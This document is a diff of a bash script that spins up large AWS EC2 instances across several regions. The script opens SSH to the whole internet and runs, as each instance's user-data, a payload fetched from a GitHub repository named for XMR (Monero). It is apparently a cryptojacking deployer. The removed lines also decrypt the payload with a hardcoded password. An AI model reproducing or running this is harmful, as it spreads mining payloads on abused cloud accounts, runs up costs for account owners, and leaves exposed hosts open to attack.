@@ -1,53 +1,35 @@
 #!/bin/bash
 
-# List of AWS regions and corresponding AMI IDs
+# Define regions and their corresponding AMI IDs
 declare -A region_image_map=(
     ["us-east-1"]="ami-0e2c8caa4b6378d8c"
     ["us-west-2"]="ami-05d38da78ce859165"
-    ["eu-central-1"]="ami-0a628e1e89aaedf80"
+    ["eu-north-1"]="ami-075449515af5df0d1"
 )
 
-# GitHub URL containing encrypted user-data
-user_data_url="https://raw.githubusercontent.com/hoanglonglouis/AnhThin-XMR/main/hostdata.txt.enc"
+# GitHub URL containing the User Data script
+user_data_url="https://raw.githubusercontent.com/hoanglonglouis/AnhThin-XMR/main/AnhThinXmr"
 
-# Temporary file paths
-encrypted_user_data="/tmp/user_data.enc"
-decrypted_user_data="/tmp/user_data.sh"
+# Temporary file to store User Data
+user_data_file="/tmp/secrett.sh"
 
-# Download encrypted user-data
-curl -s -L "$user_data_url" -o "$encrypted_user_data"
-if [ ! -s "$encrypted_user_data" ]; then
-    echo "Error: Failed to download encrypted user-data."
+# Download User Data from GitHub
+curl -s -L "$user_data_url" -o "$user_data_file"
+if [ ! -s "$user_data_file" ]; then
+    echo "Error: Failed to download user-data."
     exit 1
 fi
 
-# OpenSSL decryption
-export OPENSSL_PASS="Hoanglong@237"
-if ! openssl enc -aes-256-cbc -d -salt -in "$encrypted_user_data" -out "$decrypted_user_data" -pass pass:"$OPENSSL_PASS"; then
-    echo "Error: Failed to decrypt user-data."
-    exit 1
-fi
-chmod +x "$decrypted_user_data"
+# Convert user-data to Base64 to avoid AWS CLI issues
+user_data_base64=$(base64 --wrap=0 "$user_data_file")
 
-# Convert user-data to base64 (compatible with MacOS & Linux)
-if [[ "$(uname)" == "Darwin" ]]; then
-    user_data_base64=$(base64 "$decrypted_user_data" | tr -d '\n')
-else
-    user_data_base64=$(base64 --wrap=0 "$decrypted_user_data")
-fi
-
-if [ -z "$user_data_base64" ]; then
-    echo "Error: Failed to encode user-data to Base64."
-    exit 1
-fi
-
-# Iterate over each region
+# Loop through each region to deploy EC2 instances
 for region in "${!region_image_map[@]}"; do
-    echo "Processing region: $region"
-    image_id=${region_image_map[$region]}
+    echo "Deploying in region: $region"
+    ami_id=${region_image_map[$region]}
 
-    # Key Pair setup
-    key_name="GodLong-$region"
+    # Create Key Pair
+    key_name="Nakamura-$region"
     if ! aws ec2 describe-key-pairs --key-names "$key_name" --region "$region" > /dev/null 2>&1; then
         aws ec2 create-key-pair \
             --key-name "$key_name" \
@@ -60,7 +42,7 @@ for region in "${!region_image_map[@]}"; do
         echo "Key Pair $key_name already exists in $region"
     fi
 
-    # Security Group setup
+    # Create Security Group
     sg_name="Random-$region"
     sg_id=$(aws ec2 describe-security-groups --group-names "$sg_name" --region "$region" --query "SecurityGroups[0].GroupId" --output text 2>/dev/null)
     if [ -z "$sg_id" ]; then
@@ -75,10 +57,8 @@ for region in "${!region_image_map[@]}"; do
         echo "Security Group $sg_name already exists with ID $sg_id in $region"
     fi
 
-    # Ensure SSH (22) is allowed
-    if ! aws ec2 describe-security-groups --group-ids "$sg_id" --region "$region" \
-        --query "SecurityGroups[0].IpPermissions[?FromPort==\`22\` && ToPort==\`22\` && IpRanges[?CidrIp==\`0.0.0.0/0\`]].IpRanges" \
-        --output text | grep -q "0.0.0.0/0"; then
+    # Ensure SSH (22) port is open
+    if ! aws ec2 describe-security-group-rules --region "$region" --filters Name=group-id,Values="$sg_id" Name=ip-permission.from-port,Values=22 Name=ip-permission.to-port,Values=22 Name=ip-permission.cidr,Values=0.0.0.0/0 > /dev/null 2>&1; then
         aws ec2 authorize-security-group-ingress \
             --group-id "$sg_id" \
             --protocol tcp \
@@ -90,22 +70,24 @@ for region in "${!region_image_map[@]}"; do
         echo "SSH (22) access already configured for Security Group $sg_name in $region"
     fi
 
-    # Launch EC2 instance
-    instance_id=$(aws ec2 run-instances \
-        --image-id "$image_id" \
-        --count 1 \
-        --instance-type c7i.8xlarge \
-        --key-name "$key_name" \
-        --security-group-ids "$sg_id" \
-        --user-data "$(echo "$user_data_base64" | base64 --decode)" \
-        --region "$region" \
-        --query "Instances[0].InstanceId" \
-        --output text)
+    # Launch 2 instances per region
+    for i in {1..2}; do
+        instance_id=$(aws ec2 run-instances \
+            --image-id "$ami_id" \
+            --count 1 \
+            --instance-type "c7i.16xlarge" \
+            --key-name "$key_name" \
+            --security-group-ids "$sg_id" \
+            --user-data file://"$user_data_file" \
+            --region "$region" \
+            --query "Instances[0].InstanceId" \
+            --output text)
 
-    if [ -z "$instance_id" ]; then
-        echo "Error: Failed to launch EC2 instance in $region"
-        exit 1
-    fi
+        if [ -z "$instance_id" ]; then
+            echo "Error: Failed to launch EC2 instance in $region"
+            exit 1
+        fi
 
-    echo "On-Demand Instance $instance_id created in $region using Key Pair $key_name and Security Group $sg_name"
+        echo "On-Demand Instance $instance_id created in $region using Key Pair $key_name and Security Group $sg_name"
+    done
 done
